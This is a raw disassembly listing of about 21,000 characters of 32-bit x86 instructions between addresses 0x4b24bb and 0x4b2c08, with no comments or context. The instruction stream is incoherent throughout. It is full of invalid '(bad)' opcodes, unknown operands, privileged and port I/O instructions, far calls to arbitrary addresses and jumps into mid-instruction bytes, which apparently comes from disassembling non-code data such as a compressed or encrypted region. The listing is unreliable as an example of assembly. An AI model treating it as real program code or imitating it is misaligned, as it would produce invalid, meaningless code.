  4b24bb:	shl    BYTE PTR [esp+eiz*2+0x47],1
  4b24bf:	jae    0x4b2471
  4b24c1:	mov    al,ds:0x75ff38c2
  4b24c6:	test   eax,0x96ed56ba
  4b24cb:	jne    0x4b24fe
  4b24cd:	dec    edx
  4b24ce:	inc    edi
  4b24cf:	or     ah,ah
  4b24d1:	add    al,0xab
  4b24d3:	into   
  4b24d4:	fmul   DWORD PTR [edx+ebp*8]
  4b24d7:	sub    eax,0x1dd6e24
  4b24dc:	xor    BYTE PTR [esi+0x5e],dh
  4b24df:	fist   DWORD PTR [edi-0x7f]
  4b24e2:	ret    
  4b24e3:	push   ecx
  4b24e4:	or     DWORD PTR [esi+0x7e],ecx
  4b24e7:	xchg   esp,esi
  4b24e9:	loop   0x4b24ef
  4b24eb:	into   
  4b24ec:	es adc eax,0x4a3739eb
  4b24f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b24f3:	pop    ecx
  4b24f4:	rcl    cl,0x39
  4b24f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b24f8:	cdq    
  4b24f9:	pop    eax
  4b24fa:	lds    esp,FWORD PTR [ebp-0x11]
  4b24fd:	xor    DWORD PTR [ebx],0xf4b94983
  4b2503:	push   ss
  4b2504:	fucomi st,st(6)
  4b2506:	push   edx
  4b2507:	push   0xffffff9c
  4b2509:	mov    al,0x68
  4b250b:	retf   
  4b250c:	jne    0x4b2524
  4b250e:	popa   
  4b250f:	and    BYTE PTR [edi],cl
  4b2511:	pop    edi
  4b2512:	adc    BYTE PTR [esi+esi*2],ah
  4b2515:	popa   
  4b2516:	xchg   edx,eax
  4b2517:	or     edi,DWORD PTR [ecx-0xfae9ef8]
  4b251d:	pop    es
  4b251e:	push   esi
  4b251f:	inc    ecx
  4b2520:	gs lock cmp al,0x41
  4b2524:	inc    esi
  4b2525:	inc    ecx
  4b2526:	nop
  4b2527:	sub    BYTE PTR [ebp+ebx*2-0x7b089799],al
  4b252e:	cmp    ecx,DWORD PTR [ebp-0xd3e7843]
  4b2534:	lods   al,BYTE PTR ds:[esi]
  4b2535:	cmp    al,0xd8
  4b2537:	mov    bl,0x56
  4b2539:	stos   DWORD PTR es:[edi],eax
  4b253a:	loopne 0x4b24c5
  4b253c:	push   es
  4b253d:	(bad)  
  4b253e:	push   ebx
  4b253f:	xchg   edx,eax
  4b2540:	sbb    dl,BYTE PTR [edi-0x12ffc3b7]
  4b2546:	xchg   ecx,eax
  4b2547:	sbb    ebx,ebp
  4b2549:	fidiv  DWORD PTR [ecx-0x61]
  4b254c:	xchg   ebx,eax
  4b254d:	xchg   BYTE PTR [esi],ah
  4b254f:	popf   
  4b2550:	xor    al,0xb6
  4b2552:	fmul   DWORD PTR [edx+0x3da943b5]
  4b2558:	(bad)  
  4b2559:	lea    eax,[esi]
  4b255b:	mov    eax,0xfbffe24c
  4b2560:	push   ss
  4b2561:	nop
  4b2562:	push   edi
  4b2563:	es popa 
  4b2565:	cmc    
  4b2566:	push   ecx
  4b2567:	mov    ds:0x75f78114,eax
  4b256c:	inc    esi
  4b256d:	lds    esp,FWORD PTR [ebp+0xe]
  4b2570:	or     DWORD PTR [edi-0x4b053b7b],esi
  4b2576:	add    DWORD PTR [ebp+0x40],edx
  4b2579:	loop   0x4b250d
  4b257b:	std    
  4b257c:	repz pop ss
  4b257e:	and    al,0xe
  4b2580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b2581:	or     edx,DWORD PTR [edi+0x20]
  4b2584:	jle    0x4b25e7
  4b2586:	pusha  
  4b2587:	out    0x86,eax
  4b2589:	pusha  
  4b258a:	xor    ebx,ebx
  4b258c:	push   edx
  4b258d:	sbb    eax,esi
  4b258f:	inc    esi
  4b2590:	mov    eax,ds:0x35377c8e
  4b2595:	mov    edi,0x432c2250
  4b259a:	add    ecx,0x4
  4b259d:	cmp    ebx,eax
  4b259f:	adc    al,0x7a
  4b25a1:	dec    eax
  4b25a2:	sub    esi,DWORD PTR [eax-0x5ae08af6]
  4b25a8:	shr    BYTE PTR [esi-0x15],1
  4b25ab:	and    eax,DWORD PTR [eax]
  4b25ad:	outs   dx,DWORD PTR ds:[esi]
  4b25ae:	mov    ?,WORD PTR [eax+0x7a]
  4b25b1:	out    dx,al
  4b25b2:	test   DWORD PTR [edx],0xc5135197
  4b25b8:	xchg   esi,eax
  4b25b9:	jge    0x4b25c7
  4b25bb:	call   0x1b6:0x6c7834f
  4b25c2:	sbb    esp,DWORD PTR [edx-0x4dfefe39]
  4b25c8:	push   cs
  4b25c9:	lock xor eax,0x8798921
  4b25cf:	adc    BYTE PTR [esi+eax*4],bh
  4b25d2:	add    BYTE PTR [ebx],cl
  4b25d4:	mov    ebx,0xb8ee6b21
  4b25d9:	xchg   edx,eax
  4b25da:	xor    BYTE PTR [ebx],bh
  4b25dc:	xchg   BYTE PTR es:[ebx],bl
  4b25df:	cwde   
  4b25e0:	mov    edx,0x8836000f
  4b25e6:	sub    BYTE PTR [ecx+0x43],bh
  4b25e9:	sbb    edx,DWORD PTR [edx+0x5a]
  4b25ec:	dec    ebp
  4b25ed:	inc    ecx
  4b25ee:	inc    DWORD PTR [esp+eax*1]
  4b25f1:	or     eax,0x3a26cb0f
  4b25f6:	mov    BYTE PTR [esi+edi*4],dh
  4b25f9:	pop    edx
  4b25fa:	les    esp,FWORD PTR [edi+0xb]
  4b25fd:	cmp    bl,ch
  4b25ff:	dec    ebp
  4b2600:	jle    0x4b265a
  4b2602:	sbb    al,0x56
  4b2604:	pop    ds
  4b2605:	data16 jp 0x4b2675
  4b2608:	mov    eax,0x25480b0
  4b260d:	pop    ds
  4b260e:	mov    WORD PTR [ebp+eax*1-0x1b],?
  4b2612:	cmp    al,0xa1
  4b2614:	adc    al,0x25
  4b2616:	or     ebp,ebp
  4b2618:	add    al,0xd1
  4b261a:	inc    eax
  4b261b:	cmp    edi,DWORD PTR [edi+0x27]
  4b261e:	add    edx,ebp
  4b2620:	push   esp
  4b2621:	cdq    
  4b2622:	adc    eax,0xd5fbfcfc
  4b2627:	sub    cl,BYTE PTR [edi]
  4b2629:	add    eax,0x4c7d1f2
  4b262e:	ds xchg ebx,eax
  4b2630:	fwait
  4b2631:	cld    
  4b2632:	sti    
  4b2633:	xchg   BYTE PTR [esi+0xc3ce530],bl
  4b2639:	es push ds
  4b263b:	ficomp WORD PTR [edx+0x2c]
  4b263e:	hlt    
  4b263f:	mov    ebx,0xad8c91f8
  4b2644:	or     al,0x3b
  4b2646:	loop   0x4b25de
  4b2648:	mov    dh,0xc8
  4b264a:	lods   eax,DWORD PTR ds:[esi]
  4b264b:	jb     0x4b265d
  4b264d:	push   eax
  4b264e:	imul   esp,DWORD PTR [eax-0x77f7f4ee],0x46bd010a
  4b2658:	aam    0x15
  4b265a:	or     BYTE PTR [ebx+0x66490cea],cl
  4b2660:	mov    al,0x5b
  4b2662:	sub    ebp,DWORD PTR [ecx]
  4b2664:	into   
  4b2665:	in     eax,dx
  4b2666:	jg     0x4b269c
  4b2668:	mov    BYTE PTR [edx],0x8d
  4b266b:	pop    eax
  4b266c:	(bad)  
  4b266d:	jmp    0x4b2679
  4b266f:	sbb    BYTE PTR ds:0xb98c0575,ch
  4b2675:	mov    ecx,0x5233fdb9
  4b267a:	je     0x4b26eb
  4b267c:	or     BYTE PTR [edx+0x74],dh
  4b267f:	push   0x41
  4b2681:	je     0x4b26e1
  4b2683:	popa   
  4b2684:	je     0x4b26df
  4b2686:	mov    ecx,0x53b9b9b9
  4b268b:	je     0x4b26da
  4b268d:	jae    0x4b2703
  4b268f:	dec    eax
  4b2690:	dec    eax
  4b2691:	je     0x4b26cf
  4b2693:	push   0xb9b93774
  4b2698:	mov    ecx,0x2b744eb9
  4b269d:	outs   dx,BYTE PTR ds:[esi]
  4b269e:	je     0x4b26c6
  4b26a0:	dec    edi
  4b26a1:	je     0x4b26bd
  4b26a3:	outs   dx,DWORD PTR ds:[esi]
  4b26a4:	je     0x4b26bb
  4b26a6:	int3   
  4b26a7:	pop    ds
  4b26a8:	and    eax,0x747c54a0
  4b26ad:	jne    0xf720cea6
  4b26b3:	mov    ah,0xa3
  4b26b5:	jmp    0x4b26df
  4b26b7:	or     al,0x10
  4b26b9:	test   DWORD PTR [ebx-0x1b],0x80b2a5
  4b26c0:	add    al,BYTE PTR [eax+eax*1]
  4b26c3:	and    BYTE PTR [edx+0x1a9ae84],al
  4b26c9:	mov    DWORD PTR [ebx+eax*2+0x45f4b3c0],edx
  4b26d0:	cld    
  4b26d1:	clc    
  4b26d2:	add    eax,0xa07a8bcb
  4b26d7:	(bad)
  4b26da:	rol    BYTE PTR [edx],cl
  4b26dc:	call   0xbf8223ec
  4b26e1:	sub    eax,0x1f02b538
  4b26e6:	mov    dh,0xb5
  4b26e8:	in     al,0x23
  4b26ea:	and    eax,DWORD PTR [ebx]
  4b26ec:	push   edx
  4b26ed:	in     eax,0x78
  4b26ef:	icebp  
  4b26f0:	xchg   ebp,eax
  4b26f1:	mov    eax,ds:0x59c6f29a
  4b26f6:	xchg   esp,eax
  4b26f7:	xchg   ebp,eax
  4b26f8:	(bad)  
  4b26f9:	repz retf 0x1eca
  4b26fd:	and    bl,bh
  4b26ff:	lock std 
  4b2701:	enter  0x20f5,0x91
  4b2705:	fcom   DWORD PTR [eax-0x1b4dd834]
  4b270b:	ficom  WORD PTR ds:0x695bf3ad
  4b2711:	inc    edx
  4b2712:	(bad)  
  4b2713:	fldcw  WORD PTR [esi]
  4b2715:	mov    cl,0x30
  4b2717:	inc    edx
  4b2718:	fdivr  st,st(1)
  4b271a:	cmp    BYTE PTR [ebx],bh
  4b271c:	loop   0x4b2752
  4b271e:	jnp    0x73a56361
  4b2724:	add    eax,0x230ca7e0
  4b2729:	and    BYTE PTR [ebp+eiz*4-0x66c8bf9e],dh
  4b2730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b2731:	dec    eax
  4b2732:	mov    ah,0x69
  4b2734:	mov    dl,0x85
  4b2736:	imul   ebp,DWORD PTR [esi+0x1c093df0],0x21
  4b273d:	ror    DWORD PTR [ebx],1
  4b273f:	mov    ds:0x131c6f7,eax
  4b2744:	test   ecx,edx
  4b2746:	call   0xfb6:0x5f02982f
  4b274d:	ret    
  4b274e:	or     edx,eax
  4b2750:	fdivr  st,st(1)
  4b2752:	jmp    0x4b26ed
  4b2754:	sbb    BYTE PTR ds:0x506fb3a6,0x14
  4b275b:	cwde   
  4b275c:	and    DWORD PTR [ecx+0x5b],edx
  4b275f:	adc    BYTE PTR [ecx+0x30],ah
  4b2762:	ins    BYTE PTR es:[edi],dx
  4b2763:	imul   edx,edi,0xffffffe5
  4b2766:	push   ds
  4b2767:	xor    BYTE PTR [edx-0x54d733d4],dl
  4b276d:	fisttp DWORD PTR [eax]
  4b276f:	inc    esp
  4b2770:	xor    BYTE PTR [esi-0x24],bl
  4b2773:	mov    bx,0x26d7
  4b2777:	popa   
  4b2778:	push   edx
  4b2779:	xor    al,0xa5
  4b277b:	outs   dx,DWORD PTR ds:[esi]
  4b277c:	rol    DWORD PTR [edx-0x3612f4fd],0xd6
  4b2783:	sub    DWORD PTR [ebp+0x1b],edx
  4b2786:	push   ebp
  4b2787:	pop    esi
  4b2788:	push   esp
  4b2789:	test   BYTE PTR [eax],dh
  4b278b:	adc    ebx,DWORD PTR [edi-0x6f]
  4b278e:	or     al,0x1c
  4b2790:	xor    eax,edx
  4b2792:	mov    dl,0x28
  4b2794:	dec    esi
  4b2795:	dec    edi
  4b2796:	inc    ecx
  4b2797:	stos   DWORD PTR es:[edi],eax
  4b2798:	and    eax,0xe91b5ff
  4b279d:	mov    edi,0x10696934
  4b27a2:	mov    al,ds:0x2024edad
  4b27a7:	cmp    DWORD PTR [esi+eiz*1-0x1c],0x51d80438
  4b27af:	adc    esi,0xffffff92
  4b27b2:	iret   
  4b27b3:	add    dh,BYTE PTR [eax+0x50]
  4b27b6:	nop
  4b27b7:	addr16 inc edx
  4b27b9:	call   0x7cd4:0x103c6e40
  4b27c0:	(bad)  
  4b27c1:	adc    dl,BYTE PTR [edi+esi*8]
  4b27c4:	sub    al,BYTE PTR [eax-0x53]
  4b27c7:	mov    ecx,0x884cb90
  4b27cc:	inc    esp
  4b27cd:	add    DWORD PTR [edi-0x2a],edx
  4b27d0:	add    ecx,edi
  4b27d2:	sub    al,0xbf
  4b27d4:	dec    eax
  4b27d5:	jmp    0x4b27f3
  4b27d7:	popf   
  4b27d8:	add    DWORD PTR [esi],edx
  4b27da:	adc    DWORD PTR [esi+ebx*8+0x61eb128d],edx
  4b27e1:	sbb    eax,0x4f4710c2
  4b27e6:	fsub   DWORD PTR [ecx+0x32]
  4b27e9:	push   esp
  4b27ea:	test   eax,0x76a3574
  4b27ef:	pop    eax
  4b27f0:	inc    eax
  4b27f1:	pop    es
  4b27f2:	cmp    BYTE PTR [edi+0x74],0x98
  4b27f6:	test   eax,0x97b7ea62
  4b27fb:	sub    al,0x93
  4b27fd:	and    eax,edx
  4b27ff:	xor    BYTE PTR [ebx-0x572b9ca9],bh
  4b2805:	add    ecx,DWORD PTR [edx]
  4b2807:	push   eax
  4b2808:	mov    DWORD PTR [ebx],esi
  4b280a:	imul   ebx,DWORD PTR [edi+0x548d0507],0x4f67d00
  4b2814:	cli    
  4b2815:	xchg   esp,eax
  4b2816:	pusha  
  4b2817:	and    BYTE PTR [ecx+0x154a8bf2],ch
  4b281d:	mov    al,ds:0x588dae1e
  4b2822:	sbb    al,0x78
  4b2824:	xor    DWORD PTR [eax+0x2488becf],0x195f988d
  4b282e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b282f:	cs loop 0x4b2855
  4b2832:	fwait
  4b2833:	jbe    0x4b284a
  4b2835:	inc    ebp
  4b2836:	and    ebx,0x40
  4b2839:	call   0xf0670551
  4b283e:	or     al,0xf1
  4b2840:	cmp    al,0x8b
  4b2842:	jg     0x4b2865
  4b2844:	pusha  
  4b2845:	aas    
  4b2846:	or     eax,0xb1ea2681
  4b284b:	push   edi
  4b284c:	dec    ebx
  4b284d:	or     esp,esp
  4b284f:	dec    edi
  4b2850:	push   0x570b5eb4
  4b2855:	jo     0x4b288d
  4b2857:	add    BYTE PTR [ebx-0x687a5f04],ch
  4b285d:	rcr    DWORD PTR ds:0xd27ad390,0x2e
  4b2864:	shr    BYTE PTR [eax+0x712259ec],0x72
  4b286b:	xchg   esp,eax
  4b286c:	loope  0x4b2874
  4b286e:	push   eax
  4b286f:	xchg   edx,eax
  4b2870:	mov    al,ds:0xb78f9ce6
  4b2875:	add    BYTE PTR [ebx+0x58],al
  4b2878:	xor    eax,0x3d857465
  4b287d:	pop    edi
  4b287e:	or     cl,BYTE PTR [eax]
  4b2880:	push   esi
  4b2881:	mov    edx,DWORD PTR [ebp+0x48]
  4b2884:	mov    al,0x94
  4b2886:	adc    DWORD PTR cs:[eax+0x46c2457f],ebx
  4b288d:	and    esi,DWORD PTR [ecx-0x1e]
  4b2890:	cvtdq2ps xmm3,XMMWORD PTR [edi+0x4f]
  4b2894:	pop    eax
  4b2895:	pop    ds
  4b2896:	jp     0x4b28ca
  4b2898:	mov    WORD PTR [esp+ebx*1+0x5d],ss
  4b289c:	test   DWORD PTR [edx+0x43cf4f40],edx
  4b28a2:	adc    DWORD PTR [eiz*4-0x13739e0e],esp
  4b28a9:	lock pop ds
  4b28ab:	dec    esp
  4b28ac:	jecxz  0x4b28ee
  4b28ae:	sbb    BYTE PTR [esi-0x8],0xde
  4b28b2:	lock dec edi
  4b28b4:	add    al,0x69
  4b28b6:	dec    esi
  4b28b7:	or     esi,DWORD PTR [ebx-0x74]
  4b28ba:	or     al,0xb
  4b28bc:	adc    ecx,DWORD PTR [ebp+0x5210ca1]
  4b28c2:	xchg   esi,eax
  4b28c3:	sbb    dl,cl
  4b28c5:	rol    DWORD PTR [edi+0x3e],cl
  4b28c8:	sbb    DWORD PTR [edx+0x54],eax
  4b28cb:	dec    ebx
  4b28cc:	xlat   BYTE PTR ds:[ebx]
  4b28cd:	push   esi
  4b28ce:	mov    WORD PTR es:[ebp-0x44],fs
  4b28d2:	add    BYTE PTR [edx+esi*1],0x6f
  4b28d6:	into   
  4b28d7:	pushf  
  4b28d8:	mov    DWORD PTR [eax],ecx
  4b28da:	adc    edx,DWORD PTR [ebx]
  4b28dc:	pop    edi
  4b28dd:	in     eax,0x24
  4b28df:	or     ah,0x64
  4b28e2:	sbb    BYTE PTR [ecx+0x24],dl
  4b28e5:	inc    ebx
  4b28e6:	or     al,0xe0
  4b28e8:	inc    ebp
  4b28e9:	lods   eax,DWORD PTR ds:[esi]
  4b28ea:	sbb    BYTE PTR [edi],cl
  4b28ec:	das    
  4b28ed:	jb     0x4b2948
  4b28ef:	push   eax
  4b28f0:	jns    0x4b293d
  4b28f2:	add    al,0x50
  4b28f4:	push   esi
  4b28f5:	push   ebp
  4b28f6:	clc    
  4b28f7:	cld    
  4b28f8:	inc    ecx
  4b28f9:	sub    eax,0xf0f4a790
  4b28fe:	pop    edx
  4b28ff:	pusha  
  4b2900:	ins    DWORD PTR es:[edi],dx
  4b2901:	loope  0x4b2927
  4b2903:	inc    edx
  4b2904:	cmp    al,0x59
  4b2906:	rcl    dh,1
  4b2908:	inc    ecx
  4b2909:	jp     0x4b28f6
  4b290b:	(bad)  
  4b290c:	fst    DWORD PTR [eax]
  4b290e:	xchg   BYTE PTR [eax-0x2372ca80],dl
  4b2914:	and    al,0x7d
  4b2916:	cwde   
  4b2917:	ret    
  4b2918:	adc    eax,0x4d0c4388
  4b291d:	js     0x4b2944
  4b291f:	outs   dx,BYTE PTR ds:[esi]
  4b2920:	pusha  
  4b2921:	pop    esi
  4b2922:	(bad)  
  4b2923:	jmp    0x4b2942
  4b2925:	mov    bh,0xc1
  4b2927:	mov    ds:0x21382092,al
  4b292c:	mov    ah,0xc8
  4b292e:	push   ecx
  4b292f:	repnz dec eax
  4b2931:	lock dec ebp
  4b2933:	in     al,dx
  4b2934:	push   ecx
  4b2935:	in     al,dx
  4b2936:	mov    WORD PTR [eax+edx*1+0x32],ds
  4b293a:	call   0x2dc30e1b
  4b293f:	test   eax,0x348bff95
  4b2944:	sub    cl,BYTE PTR [edx]
  4b2946:	jb     0x4b2950
  4b2948:	adc    esi,DWORD PTR [eax+ecx*1+0x6]
  4b294c:	or     BYTE PTR [edi],0x89
  4b294f:	mov    cl,0xe5
  4b2951:	and    BYTE PTR [edi-0x76eb14ed],ah
  4b2957:	(bad)  
  4b2958:	in     al,dx
  4b2959:	add    bh,BYTE PTR [ecx-0x5f14faa8]
  4b295f:	call   0xf6022b71
  4b2964:	and    BYTE PTR [ebx+esi*8],al
  4b2967:	test   BYTE PTR [eax],0x64
  4b296a:	sub    ah,ch
  4b296c:	xchg   edi,eax
  4b296d:	cmp    BYTE PTR [ebx-0x6f3cf1f4],0x1c
  4b2974:	loopne 0x4b2973
  4b2976:	call   0xe3470980
  4b297b:	nop
  4b297c:	pop    ss
  4b297d:	dec    ebx
  4b297e:	mov    ch,0xe0
  4b2980:	adc    esi,DWORD PTR [edx+edx*4-0x135f5bd7]
  4b2987:	or     al,0x64
  4b2989:	or     BYTE PTR [esi-0x64d75c18],ch
  4b298f:	cld    
  4b2990:	xchg   ebp,eax
  4b2991:	clc    
  4b2992:	push   es
  4b2993:	imul   ecx,DWORD PTR [ebp+eax*4-0x7f],0x5b2c79d8
  4b299b:	cdq    
  4b299c:	add    BYTE PTR [esi],bl
  4b299e:	pop    esi
  4b299f:	push   edx
  4b29a0:	mov    al,ds:0x29a470
  4b29a5:	xchg   ebx,eax
  4b29a6:	add    dl,BYTE PTR [eax+0x22e29052]
  4b29ac:	into   
  4b29ad:	adc    dl,BYTE PTR [edx+0x71]
  4b29b0:	add    bh,bh
  4b29b2:	nop
  4b29b3:	test   eax,0x5c845b1d
  4b29b8:	lea    edi,[ebx-0x2]
  4b29bb:	cmp    eax,0x66761ed6
  4b29c0:	push   ebp
  4b29c1:	cmp    dh,BYTE PTR [ebp+0x4b]
  4b29c4:	and    bh,bh
  4b29c6:	jno    0x4b2a3d
  4b29c8:	cmp    eax,0x4b068612
  4b29cd:	sub    al,0x50
  4b29cf:	aam    0x6
  4b29d1:	lock aam 0x52
  4b29d4:	jle    0x4b298f
  4b29d6:	xor    al,0xf1
  4b29d8:	xor    eax,0xe0784d5
  4b29dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b29de:	xchg   esi,eax
  4b29df:	xor    al,0xa0
  4b29e1:	mov    esi,0x4e7715bf
  4b29e6:	cmp    eax,DWORD PTR [eax+0x79d2acab]
  4b29ec:	xlat   BYTE PTR ds:[ebx]
  4b29ed:	gs or  al,0x56
  4b29f0:	jmp    0x4b29dc
  4b29f2:	jmp    0xd4a38695
  4b29f7:	mov    ah,0xeb
  4b29f9:	push   ebx
  4b29fa:	sbb    eax,0x54872ac0
  4b29ff:	push   cs
  4b2a00:	xor    eax,edx
  4b2a02:	and    ah,ah
  4b2a04:	and    DWORD PTR [eax],0xf8134395
  4b2a0a:	jmp    0xfc90:0xf536b078
  4b2a11:	inc    edi
  4b2a12:	ins    BYTE PTR es:[edi],dx
  4b2a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b2a14:	in     al,0x64
  4b2a16:	fdivr  st,st(0)
  4b2a18:	out    0x13,al
  4b2a1a:	or     BYTE PTR [eax+0x2],bl
  4b2a1d:	jecxz  0x4b29f5
  4b2a1f:	ss push es
  4b2a21:	adc    bh,dl
  4b2a23:	outs   dx,BYTE PTR ds:[esi]
  4b2a24:	sar    DWORD PTR [eax-0x62],0x1
  4b2a28:	pop    ds
  4b2a29:	add    BYTE PTR [ecx-0x739ee8f9],dh
  4b2a2f:	sahf   
  4b2a30:	jmp    0x4b2a4d
  4b2a32:	pop    es
  4b2a33:	dec    edx
  4b2a34:	enter  0x7a34,0xf3
  4b2a38:	inc    ecx
  4b2a39:	and    eax,0xb5573c07
  4b2a3e:	cdq    
  4b2a3f:	mov    ecx,0xaf8e265c
  4b2a44:	int3   
  4b2a45:	rcl    ah,1
  4b2a47:	sub    al,0x90
  4b2a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b2a4a:	jb     0x4b2a24
  4b2a4c:	ror    ah,1
  4b2a4e:	add    al,0xe0
  4b2a50:	adc    DWORD PTR [ecx+ebp*4],eax
  4b2a53:	int3   
  4b2a54:	(bad)  
  4b2a55:	je     0x4b2aaf
  4b2a57:	imul   edx,edx,0x41
  4b2a5a:	jle    0x4b29dc
  4b2a5c:	and    edi,ebx
  4b2a5e:	ins    DWORD PTR es:[edi],dx
  4b2a5f:	xchg   cl,ch
  4b2a61:	dec    ecx
  4b2a62:	dec    ecx
  4b2a63:	lahf   
  4b2a64:	mov    BYTE PTR [eax+0x26],bh
  4b2a67:	sub    BYTE PTR [ebp+0x49],al
  4b2a6a:	jns    0x4b2a49
  4b2a6c:	sbb    ebp,ebx
  4b2a6e:	dec    edx
  4b2a6f:	outs   dx,BYTE PTR ds:[esi]
  4b2a70:	call   0xf2f4:0x5dcc1560
  4b2a77:	pop    esp
  4b2a78:	push   ecx
  4b2a79:	sar    DWORD PTR [ebx+0x304cdcec],0x5d
  4b2a80:	add    DWORD PTR [eax+0x63],edx
  4b2a83:	sbb    bl,cl
  4b2a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b2a86:	pusha  
  4b2a87:	xchg   esp,eax
  4b2a88:	mov    eax,gs
  4b2a8a:	in     al,dx
  4b2a8b:	add    bh,BYTE PTR [ecx+0x2a]
  4b2a8e:	xchg   edi,eax
  4b2a8f:	lock hlt 
  4b2a91:	in     al,dx
  4b2a92:	call   0xd77eb3a5
  4b2a97:	sti    
  4b2a98:	jl     0x4b2a26
  4b2a9a:	imul   ecx,DWORD PTR [edi+0x23045744],0xda5fcce0
  4b2aa4:	je     0x4b2a2d
  4b2aa6:	xor    al,0x32
  4b2aa8:	imul   ebx,DWORD PTR [eax+0x6b],0x43956c1d
  4b2aaf:	sub    al,BYTE PTR [edi-0x77b287a4]
  4b2ab5:	jmp    0x4b2a47
  4b2ab7:	retf   0x3e21
  4b2aba:	xchg   esp,eax
  4b2abb:	das    
  4b2abc:	xor    al,0x1a
  4b2abe:	mov    al,0x46
  4b2ac0:	das    
  4b2ac1:	cmp    ebx,DWORD PTR [edx-0xcaa36f9]
  4b2ac7:	call   0x32200491
  4b2acc:	push   es
  4b2acd:	iret   
  4b2ace:	repz push es
  4b2ad0:	jecxz  0x4b2ac4
  4b2ad2:	add    DWORD PTR [edx-0x7d],ebx
  4b2ad5:	loope  0x4b2b3f
  4b2ad7:	and    dh,BYTE PTR [eax+0x34]
  4b2ada:	and    DWORD PTR [eax],edi
  4b2adc:	rol    BYTE PTR fs:[esi-0x38],cl
  4b2ae0:	push   ebx
  4b2ae1:	retf   
  4b2ae2:	sahf   
  4b2ae3:	xchg   esp,eax
  4b2ae4:	xor    dh,BYTE PTR [eax-0x7f]
  4b2ae7:	imul   edi,DWORD PTR [ecx+ebx*1+0x35],0xa5680e90
  4b2aef:	fiadd  WORD PTR [ecx]
  4b2af1:	js     0x4b2b2e
  4b2af3:	and    BYTE PTR [edi-0x1fb7dbce],ah
  4b2af9:	cmp    eax,0x2c280947
  4b2afe:	jb     0x4b2b30
  4b2b00:	ret    0xa60f
  4b2b03:	loope  0x4b2b2e
  4b2b05:	mov    al,ds:0xdcabb468
  4b2b0a:	sbb    eax,0x4a2bdaf9
  4b2b0f:	fdivr  QWORD PTR [ebx-0xdcadd40]
  4b2b15:	mov    esp,0x4c911287
  4b2b1a:	inc    esi
  4b2b1b:	rcl    BYTE PTR [ecx-0x6e],1
  4b2b1e:	cmp    al,0xed
  4b2b20:	dec    esi
  4b2b21:	jne    0x4b2b3d
  4b2b23:	xchg   esi,eax
  4b2b24:	sub    al,al
  4b2b26:	push   edx
  4b2b27:	ror    BYTE PTR [edx+0xdaba014],cl
  4b2b2d:	and    eax,0xe5ae6d2
  4b2b32:	fnstcw WORD PTR [edi+0x2ff12ac0]
  4b2b38:	fisubr WORD PTR [eax+0x6750f447]
  4b2b3e:	lods   eax,DWORD PTR ds:[esi]
  4b2b3f:	dec    esp
  4b2b40:	mov    edi,0x9fa9abdc
  4b2b45:	adc    al,0x52
  4b2b47:	jg     0x4b2bb5
  4b2b49:	xor    eax,0xc44118c
  4b2b4e:	xchg   ebp,eax
  4b2b4f:	in     eax,dx
  4b2b50:	push   ecx
  4b2b51:	push   ecx
  4b2b52:	cmp    ebx,DWORD PTR [eax+0x1e]
  4b2b55:	mov    esp,0xac14bb7c
  4b2b5a:	adc    eax,0xb31a8110
  4b2b5f:	mov    ebx,0x7d14d9b4
  4b2b64:	xor    BYTE PTR [edi],dh
  4b2b66:	adc    BYTE PTR [eax],0x75
  4b2b69:	push   eax
  4b2b6a:	pop    ecx
  4b2b6b:	or     BYTE PTR [ebx],0x2b
  4b2b6e:	je     0x4b2b8b
  4b2b70:	sti    
  4b2b71:	lds    ebp,FWORD PTR [ecx+esi*1+0x3cbbd817]
  4b2b78:	stos   DWORD PTR es:[edi],eax
  4b2b79:	cmc    
  4b2b7a:	jmp    0x82ad03db
  4b2b7f:	mov    ebp,ebx
  4b2b81:	xor    eax,0x21042581
  4b2b86:	mov    dl,0xc1
  4b2b88:	mov    DWORD PTR [edi],edi
  4b2b8a:	mov    ebp,0x841b0018
  4b2b8f:	(bad)  
  4b2b90:	fs push ss
  4b2b92:	or     BYTE PTR [eax],cl
  4b2b94:	int    0xe5
  4b2b96:	retf   0x1654
  4b2b99:	or     ch,0x45
  4b2b9c:	dec    ebp
  4b2b9d:	(bad)  
  4b2b9e:	push   edi
  4b2b9f:	cmp    al,0xa
  4b2ba1:	sub    cl,al
  4b2ba3:	dec    edx
  4b2ba4:	cmp    ebx,esi
  4b2ba6:	dec    edx
  4b2ba7:	adc    eax,0xbe1ea158
  4b2bac:	dec    edx
  4b2bad:	sub    ah,BYTE PTR [esi-0x64]
  4b2bb0:	add    al,0xf5
  4b2bb2:	sub    al,0xd
  4b2bb4:	jnp    0x4b2bc9
  4b2bb6:	xchg   si,bp
  4b2bb9:	push   0xb6504006
  4b2bbe:	sti    
  4b2bbf:	dec    edx
  4b2bc0:	es pop esi
  4b2bc2:	dec    esi
  4b2bc3:	aas    
  4b2bc4:	xor    eax,0xc361e120
  4b2bc9:	push   ecx
  4b2bca:	sub    eax,DWORD PTR [ebx+0x1a]
  4b2bcd:	cmp    BYTE PTR [ecx+ecx*4+0x4],bl
  4b2bd1:	sub    BYTE PTR [edi+0x69],al
  4b2bd4:	scas   eax,DWORD PTR es:[edi]
  4b2bd5:	add    al,0xac
  4b2bd7:	idiv   DWORD PTR [ecx+0x16]
  4b2bda:	or     BYTE PTR es:[ecx+eax*8],al
  4b2bde:	adc    dl,cl
  4b2be0:	push   ebx
  4b2be1:	ret    0x5ab0
  4b2be4:	add    esi,DWORD PTR [ecx-0x46]
  4b2be7:	cmovno edx,DWORD PTR [eiz*1+0x2a827940]
  4b2bef:	sbb    al,0x49
  4b2bf1:	jbe    0x4b2b85
  4b2bf3:	dec    eax
  4b2bf4:	pop    ecx
  4b2bf5:	shl    BYTE PTR [ebx+edi*8+0x80f0262],1
  4b2bfc:	xor    al,0x5
  4b2bfe:	or     ah,BYTE PTR [eax+0x4059b535]
  4b2c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b2c05:	add    BYTE PTR [edi],dl
  4b2c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b2c08:	add    al,BYTE PTR es:[esi-0x22adeac0]
